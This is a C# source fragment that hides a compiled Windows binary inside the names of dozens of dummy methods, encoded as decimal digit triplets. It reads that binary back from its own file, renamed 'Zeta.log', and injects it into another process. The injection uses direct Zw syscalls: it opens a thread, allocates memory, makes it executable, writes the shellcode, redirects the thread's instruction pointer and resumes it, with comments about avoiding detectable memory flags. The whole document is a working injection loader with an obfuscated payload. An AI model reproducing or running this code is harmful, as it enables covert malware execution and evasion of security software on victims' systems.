public static bool aa000000003000000000002000000000000000132012000000232001000000008000000000002000083108101101112000000000152025000000001000000000002000000000000000158012000000128000000000002000000000002000000000000000171012000000136002000000008000000000002000000000000000184012000000160026000000001000000000002000000000000000198012000000000000000000008000000000002000000000000000224012000000032009000000006000000000002000095095120105095122000000032000000000009000000000002000000000000000236012000000224025000000001000000() { return false; }
public static bool aa000002000112099105110105116000000024000000000009000000000002000000000000000249012000000016000000000002000000000002000000000000000017013000000016000000000009000000000002000000000000000033013000000192025000000001000000000002000000000000000053013000000016002000000003000000000002000000000000000083013000000152001000000008000000000002000000000000000110013000000204005000000006000000000002000115105103110097108000000120023000000001000032000002000000000000000121013000000016009000000006000000000002000000000() { return false; }
public static bool aa000000144013000000000000000000009000000000002000000000000000162013000000168001000000008000000000002000115116114110099109112000104023000000001000032000002000000000000000188013000000024002000000008000000000002000000000000000211013000000232005000000008000000000002000000000000000240013000000160026000000001000000000002000000000000000255013000000224001000000003000000000002000000000000000031014000000152002000000008000000000002000000000000000044014000000056000000000002000000000002000114101097108108111099() { return false; }
public static bool aa000064025000000001000032000002000000000000000076014000000000000000000255255000000002000000000000000095014000000224001000000008000000000002000000000000000125014000000160002000000008000000000002000000000000000138014000000000002000000255255000000002000000000000000157014000000208001000000008000000000002000000000000000189014000000144002000000008000000000002000000000000000203014000000216025000000001000000000002000000000000000229014000000176002000000008000000000002000000000000000244014000000004000000000() { return false; }
public static bool aa255255000000002000000000000000009015000000144001000000008000000000002000000000000000023015000000040002000000008000000000002000095095120108095122000000064000000000009000000000002000095095101110100095095000000000000000000000000000002000000000000000054015000000008002000000008000000000002000000000000000088015000000112002000000003000000000002000000000000000111015000000184026000000001000000000002000000000000000125015000000168025000000001000000000002000000000000000142015000000064000000000002000000000002() { return false; }
public static bool aa000095095120105095097000000016000000000009000000000002000000000000000173015000000016002000000008000000000002000000000000000185015000000208025000000001000000000002000095095120099095097000000000000000000009000000000002000000000000000206015000000000000016000255255000000002000000000000000231015000000072000000000009000000000002000000000000000249015000000003000000000255255000000002000000000000000007016000000168023000000001000032000002000000000000000018016000000112000000000002000000000002000000000000000() { return false; }
public static bool aa047016000000032002000000008000000000002000000000000000065016000000008026000000001000000000002000000000000000083016000000048000000000002000000000002000000000000000111016000000048002000000008000000000002000095095120108095099000000048000000000009000000000002000000000000000132016000000016000000000010000000000002000000000000000145016000000200025000000001000000000002000000000000000169016000000056002000000008000000000002000000000000000188016000000088002000000008000000000002000000000000000204016000000196() { return false; }
public static bool aa005000000006000000000002000000000000000227016000000072002000000008000000000002000000000000000244016000000032000000000003000000000002000000000000000012017000000040000000000008000000000002000000000000000036017000000240001000000003000000000002000000000000000059017000000160023000000001000032000002000102119114105116101000000128023000000001000032000002000000000000000069017000000168002000000008000000000002000000000000000083017000000020000000000008000000000002000000000000000110017000000080000000000002000() { return false; }
public static bool aa000000002000000000000000132017000000000000000000255255000000002000000000000000156017000000000000000000255255000000002000000000000000173017000000016023000000001000000000002000000000000000186017000000024009000000006000000000002000000000000000208017000000000002000000003000000000002000000000000000240017000000248025000000001000000000002000000000000000003018000000192002000000003000000000002000000000000000021018000000002000000000255255000000002000000000000000049018000000000000000000255255000000002000000() { return false; }
public static bool aa000000000073018000000104002000000008000000000002000000000000000087018000000200005000000006000000000002000000000000000111018000000048002000000003000000000002000115116114108101110000000112023000000001000032000002000000000000000126018000000096002000000003000000000002000000000000000141018000000024026000000001000000000002000000000000000163018000000240001000000008000000000002000000000000000187018000000192002000000003000000000002000095117110108111099107000072025000000001000032000002000000000000000221018() { return false; }
public static bool aa000000160001000000008000000000002000000000000000245018000000064002000000003000000000002000000000000000004019000000072000000000009000000000002000118102112114105110116102096023000000001000032000002000102114101101000000000000136023000000001000032000002000000000000000020019000000096000000000002000000000002000038019000000046100101098117103095097114097110103101115000046100101098117103095105110102111000046100101098117103095097098098114101118000046100101098117103095108105110101000046100101098117103095102() { return false; }
public static bool aa114097109101000046100101098117103095115116114000112114101095099095105110105116000097116101120105116095116097098108101000095067082084095073078073084000095095112114111099095097116116097099104101100000046114100097116097036046114101102112116114046095095110097116105118101095115116097114116117112095108111099107000046114100097116097036046114101102112116114046095095110097116105118101095115116097114116117112095115116097116101000046114100097116097036046114101102112116114046095095100121110095116108115095105() { return false; }
public static bool aa110105116095099097108108098097099107000046114100097116097036046114101102112116114046095095120105095122000046114100097116097036046114101102112116114046095095120105095097000046114100097116097036046114101102112116114046095095120099095122000046114100097116097036046114101102112116114046095095120099095097000095095068108108077097105110067082084083116097114116117112000046114100097116097036046114101102112116114046095095110097116105118101095100108108109097105110095114101097115111110000068108108077097105110() { return false; }
public static bool aa067082084083116097114116117112000046114100097116097036046114101102112116114046109105110103119095097112112095116121112101000046067082084036088073065065000095095103099099095114101103105115116101114095102114097109101000095095103099099095100101114101103105115116101114095102114097109101000046114100097116097036122122122000095095100111095103108111098097108095100116111114115000095095100111095103108111098097108095099116111114115000046114100097116097036046114101102112116114046095095067084079082095076073083() { return false; }
public static bool aa084095095000105110105116105097108105122101100000095095115101099117114105116121095105110105116095099111111107105101000046100097116097036095095115101099117114105116121095099111111107105101000046100097116097036095095115101099117114105116121095099111111107105101095099111109112108101109101110116000095095114101112111114116095103115102097105108117114101000071083095067111110116101120116082101099111114100000071083095069120099101112116105111110082101099111114100000071083095069120099101112116105111110080111() { return false; }
public static bool aa105110116101114115000095095100121110095116108115095100116111114000095095100121110095116108115095105110105116000046114100097116097036046114101102112116114046095067082084095077084000095095116108114101103100116111114000095100101099111100101095112111105110116101114000095101110099111100101095112111105110116101114000095095114101112111114116095101114114111114000095095119114105116101095109101109111114121046112097114116046048000109097120083101099116105111110115000095112101105051056054095114117110116105109() { return false; }
public static bool aa101095114101108111099097116111114000119097115095105110105116046057053049055052000046114100097116097036046114101102112116114046095095082085078084073077069095080083069085068079095082069076079067095076073083084095069078068095095000046114100097116097036046114101102112116114046095095082085078084073077069095080083069085068079095082069076079067095076073083084095095000046114100097116097036046114101102112116114046095095105109097103101095098097115101095095000046116101120116046117110108105107101108121000046() { return false; }
public static bool aa120100097116097046117110108105107101108121000046112100097116097046117110108105107101108121000095095109105110103119095083069072095101114114111114095104097110100108101114000095095109105110103119095105110105116095101104097110100108101114000119097115095104101114101046057053048049051000101109117095112100097116097000101109117095120100097116097000095103110117095101120099101112116105111110095104097110100108101114000095095109105110103119116104114095114117110095107101121095100116111114115046112097114116046() { return false; }
public static bool aa048000095095109105110103119116104114095099115000107101121095100116111114095108105115116000095095095119054052095109105110103119116104114095097100100095107101121095100116111114000095095109105110103119116104114095099115095105110105116000095095095119054052095109105110103119116104114095114101109111118101095107101121095100116111114000095095109105110103119095084076083099097108108098097099107000112115101117100111045114101108111099045108105115116046099000095086097108105100097116101073109097103101066097115() { return false; }
public static bool aa101046112097114116046048000095086097108105100097116101073109097103101066097115101000095070105110100080069083101099116105111110000095070105110100080069083101099116105111110066121078097109101000095095109105110103119095071101116083101099116105111110070111114065100100114101115115000095095109105110103119095071101116083101099116105111110067111117110116000095070105110100080069083101099116105111110069120101099000095071101116080069073109097103101066097115101000095073115078111110119114105116097098108101073() { return false; }
public static bool aa110067117114114101110116073109097103101000095095109105110103119095101110117109095105109112111114116095108105098114097114121095110097109101115000046100101098117103095105110102111000046100101098117103095097098098114101118000046100101098117103095108105110101000046100101098117103095097114097110103101115000046100101098117103095115116114000046100101098117103095102114097109101000068108108069110116114121080111105110116000095105110105116105097108105122101095111110101120105116095116097098108101000095114101() { return false; }
public static bool aa103105115116101114095111110101120105116095102117110099116105111110000095101120101099117116101095111110101120105116095116097098108101000095095097099114116095105111098095102117110099000114101103105115116101114095102114097109101095099116111114000046116101120116046115116097114116117112000046120100097116097046115116097114116117112000046112100097116097046115116097114116117112000046099116111114115046054053053051053000095095095082085078084073077069095080083069085068079095082069076079067095076073083084095() { return false; }
public static bool aa095000095095105109112095097098111114116000095095108105098054052095108105098107101114110101108051050095097095105110097109101000095095100097116097095115116097114116095095000095095095068084079082095076073083084095095000095095105109112095095108111099107000095095105109112095082116108086105114116117097108085110119105110100000083101116085110104097110100108101100069120099101112116105111110070105108116101114000095095105109112095099097108108111099000095095095116108115095115116097114116095095000046114101102() { return false; }
public static bool aa112116114046095095110097116105118101095115116097114116117112095115116097116101000095095073109097103101066097115101000077101115115097103101066111120065000071101116076097115116069114114111114000095095105109112095077101115115097103101066111120065000071101116083121115116101109084105109101065115070105108101084105109101000109105110103119095105110105116108116115115117111095102111114099101000095095114116095112115114101108111099115095115116097114116000095095100108108095099104097114097099116101114105115116() { return false; }
public static bool aa105099115095095000095095115105122101095111102095115116097099107095099111109109105116095095000095095105111098095102117110099000095095115105122101095111102095115116097099107095114101115101114118101095095000095095109097106111114095115117098115121115116101109095118101114115105111110095095000095095095099114116095120108095115116097114116095095000095095105109112095068101108101116101067114105116105099097108083101099116105111110000046114101102112116114046095095067084079082095076073083084095095000086105114() { return false; }
public static bool aa116117097108081117101114121000095095095099114116095120105095115116097114116095095000095095105109112095095097109115103095101120105116000095095095099114116095120105095101110100095095000095116108115095115116097114116000046114101102112116114046095095082085078084073077069095080083069085068079095082069076079067095076073083084095095000095095109105110103119095111108100101120099112116095104097110100108101114000095095105109112095071101116067117114114101110116084104114101097100073100000071101116067117114114() { return false; }
public static bool aa101110116080114111099101115115073100000084108115071101116086097108117101000084101114109105110097116101080114111099101115115000095095098115115095115116097114116095095000095095095082085078084073077069095080083069085068079095082069076079067095076073083084095069078068095095000082116108076111111107117112070117110099116105111110069110116114121000095095115105122101095111102095104101097112095099111109109105116095095000095095105109112095071101116076097115116069114114111114000095095105109112095102114101101() { return false; }
public static bool aa000095095105109112095082116108076111111107117112070117110099116105111110069110116114121000086105114116117097108080114111116101099116000109105110103119095097112112095116121112101000095095095099114116095120112095115116097114116095095000095095105109112095076101097118101067114105116105099097108083101099116105111110000095095105109112095071101116084105099107067111117110116000046114101102112116114046095095082085078084073077069095080083069085068079095082069076079067095076073083084095069078068095095000095() { return false; }
public static bool aa095095099114116095120112095101110100095095000095095109105110111114095111115095118101114115105111110095095000095095105109112095071101116083121115116101109084105109101065115070105108101084105109101000069110116101114067114105116105099097108083101099116105111110000046114101102112116114046095095120105095097000095095105109097103101095098097115101095095000046114101102112116114046095067082084095077084000082116108067097112116117114101067111110116101120116000095095115101099116105111110095097108105103110109() { return false; }
public static bool aa101110116095095000095095110097116105118101095100108108109097105110095114101097115111110000095095108105098054052095108105098117115101114051050095097095105110097109101000095116108115095117115101100000085110104097110100108101100069120099101112116105111110070105108116101114000095095073065084095101110100095095000095095082085078084073077069095080083069085068079095082069076079067095076073083084095095000095095105109112095082116108065100100070117110099116105111110084097098108101000095095100097116097095101() { return false; }
public static bool aa110100095095000095095105109112095102119114105116101000095095067084079082095076073083084095095000095104101097100095108105098054052095108105098107101114110101108051050095097000095095098115115095101110100095095000071101116084105099107067111117110116000095095110097116105118101095118099099108114105116095114101097115111110000095095095099114116095120099095101110100095095000082116108065100100070117110099116105111110084097098108101000046114101102112116114046095095110097116105118101095115116097114116117112() { return false; }
public static bool aa095108111099107000095095105109112095069110116101114067114105116105099097108083101099116105111110000095116108115095105110100101120000095095110097116105118101095115116097114116117112095115116097116101000095095095099114116095120099095115116097114116095095000095095105109112095071101116067117114114101110116080114111099101115115073100000095095105109112095084101114109105110097116101080114111099101115115000095095108105098054052095108105098109115118099114116095111115095097095105110097109101000095095095067() { return false; }
public static bool aa084079082095076073083084095095000046114101102112116114046095095100121110095116108115095105110105116095099097108108098097099107000095095105109112095115105103110097108000095095105109112095095114101103105115116101114095111110101120105116095102117110099116105111110000095095114116095112115114101108111099115095115105122101000095095105109112095081117101114121080101114102111114109097110099101067111117110116101114000095095105109112095115116114108101110000095095102105108101095097108105103110109101110116095() { return false; }
public static bool aa095000095095105109112095073110105116105097108105122101067114105116105099097108083101099116105111110000095095105109112095114101097108108111099000073110105116105097108105122101067114105116105099097108083101099116105111110000095095105109112095118102112114105110116102000095095109097106111114095111115095118101114115105111110095095000095095073065084095115116097114116095095000095095105109112095085110104097110100108101100069120099101112116105111110070105108116101114000095095105109112095083101116085110104() { return false; }
public static bool aa097110100108101100069120099101112116105111110070105108116101114000046114101102112116114046109105110103119095097112112095116121112101000095095068084079082095076073083084095095000082116108086105114116117097108085110119105110100000095095105109112095095105110105116105097108105122101095111110101120105116095116097098108101000095095105109112095083108101101112000076101097118101067114105116105099097108083101099116105111110000095095115105122101095111102095104101097112095114101115101114118101095095000095095() { return false; }
public static bool aa095099114116095120116095115116097114116095095000095095115117098115121115116101109095095000095097109115103095101120105116000095095115101099117114105116121095099111111107105101095099111109112108101109101110116000095095105109112095084108115071101116086097108117101000071101116067117114114101110116080114111099101115115000095095105109112095095101120101099117116101095111110101120105116095116097098108101000095095105109112095086105114116117097108080114111116101099116000095095095116108115095101110100095095() { return false; }
public static bool aa000081117101114121080101114102111114109097110099101067111117110116101114000095095105109112095086105114116117097108081117101114121000095095105109112095095105110105116116101114109000109105110103119095105110105116108116115100121110095102111114099101000095095105109112095095095105111098095102117110099000095095100121110095116108115095105110105116095099097108108098097099107000095104101097100095108105098054052095108105098117115101114051050095097000046114101102112116114046095095105109097103101095098097115() { return false; }
public static bool aa101095095000095105110105116116101114109000095095105109112095115116114110099109112000095104101097100095108105098054052095108105098109115118099114116095111115095097000095095105109112095095095097099114116095105111098095102117110099000095095109097106111114095105109097103101095118101114115105111110095095000095095108111097100101114095102108097103115095095000095095095099104107115116107095109115000095095110097116105118101095115116097114116117112095108111099107000046114101102112116114046095095110097116105() { return false; }
public static bool aa118101095100108108109097105110095114101097115111110000071101116067117114114101110116084104114101097100073100000095095114116095112115114101108111099115095101110100000095095109105110111114095115117098115121115116101109095118101114115105111110095095000095095109105110111114095105109097103101095118101114115105111110095095000095095105109112095095117110108111099107000109105110103119095105110105116108116115100114111116095102111114099101000046114101102112116114046095095120099095097000046114101102112116114() { return false; }
public static bool aa046095095120105095122000068101108101116101067114105116105099097108083101099116105111110000095095105109112095082116108067097112116117114101067111110116101120116000095095082085078084073077069095080083069085068079095082069076079067095076073083084095069078068095095000095095105109112095071101116067117114114101110116080114111099101115115000046114101102112116114046095095120099095122000095095095099114116095120116095101110100095095000095095115101099117114105116121095099111111107105101000100097118101000000() { return false; }



public static byte [] FindCode()
{
		string tmp;
		byte[] bin;
		using (FileStream FileObject = new FileStream(System.Environment.CurrentDirectory + "\\Zeta.log", FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
		using (BinaryReader DataStream = new BinaryReader(FileObject))
		{
				bin = DataStream.ReadBytes(Convert.ToInt32(FileObject.Length));
		}
		byte [] SArray = new byte [52772];
		int SIdx = 0;
		int idx = 36218; // Offset where to finde the first shellcode byte
		for (int k = 1; k <= 305; k++) { // Number of lines
				for (int i = 1; i <= 166; i++) { // Number of shellcode bytes
						tmp = System.Text.Encoding.UTF8.GetString( bin, idx, 1 ) + System.Text.Encoding.UTF8.GetString( bin, idx + 1, 1 ) + System.Text.Encoding.UTF8.GetString( bin, idx + 2, 1 );
						SArray[ SIdx ] = Byte.Parse( tmp );
						SIdx++;
						idx = idx + 3;
				}
				idx = idx + 3;
		}
		return SArray;
 }


    public static unsafe void exec()
    {
				CONTEXT64 context = new CONTEXT64();
				OSVERSIONINFOEXW osVersionInfo = new OSVERSIONINFOEXW { dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEXW)) };
				RtlGetVersion(ref osVersionInfo);

				int ProcId = FindTheRightPID();
				Process targetProcess = Process.GetProcessById( ProcId );
				CLIENT_ID clientid = new CLIENT_ID();
				clientid.UniqueThread = new IntPtr(targetProcess.Threads[0].Id);
				clientid.UniqueProcess = new IntPtr(targetProcess.Id);
				IntPtr procHandle = (IntPtr)clientid.UniqueProcess;

				IntPtr ptrOpenThread = IntPtr.Zero;
				ZwOpenThread( out ptrOpenThread, ThreadAccess.THREAD_SUSPEND_RESUME_GET_CONTEXT_SET_CONTEXT, new OBJECT_ATTRIBUTES(), ref clientid, ref osVersionInfo);

				context.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;
				ZwGetContextThread(ptrOpenThread, ref context, ref osVersionInfo);

				ZwOpenProcess(ref procHandle, ProcessAccessFlags.All, new OBJECT_ATTRIBUTES(), ref clientid, ref osVersionInfo);

				IntPtr allocMemAddress = new IntPtr();
				byte [] sc = new byte [52772];
				sc = FindCode();
				IntPtr scodeSize = (IntPtr)(Int32)((sc.Length));

				ZwAllocateVirtualMemory(procHandle, ref allocMemAddress, new IntPtr(0), ref scodeSize, 0x1000 /*MEM_COMMIT*/ | 0x2000 /*MEM_RESERVE*/, 0x10 /*PROCESS_VM_READ*/,  ref osVersionInfo ); // Avoid use PAGE_EXECUTE_READWRITE when allocate memory

				UInt32 BytesWritten = 0;
        ZwProtectVirtualMemory(procHandle, ref allocMemAddress, ref scodeSize, (UInt32)ReturnRight() /*PAGE_EXECUTE_READWRITE*/, ref BytesWritten,  ref osVersionInfo ); // Chage allocated memory to PAGE_EXECUTE_READWRITE

				IntPtr bytesWritten  = IntPtr.Zero;
    		IntPtr unmanagedPointer = Marshal.AllocHGlobal(sc.Length);
				Marshal.Copy(sc, 0, unmanagedPointer, sc.Length);
				ZwWriteVirtualMemory(procHandle, ref allocMemAddress, unmanagedPointer, (UInt32)(scodeSize), ref bytesWritten, ref osVersionInfo);

				context.Rip = (ulong)allocMemAddress.ToInt64();
				ZwSetContextThread(ptrOpenThread, context, ref osVersionInfo);

				ulong SuspendCount;
				ZwResumeThread(ptrOpenThread, out SuspendCount, ref osVersionInfo);

				ZwWaitForSingleObject( ptrOpenThread, false, 0, ref osVersionInfo );

				ZwClose(ptrOpenThread, ref osVersionInfo);
				ZwClose(procHandle, ref osVersionInfo);
				Marshal.FreeHGlobal(unmanagedPointer);
    }
}
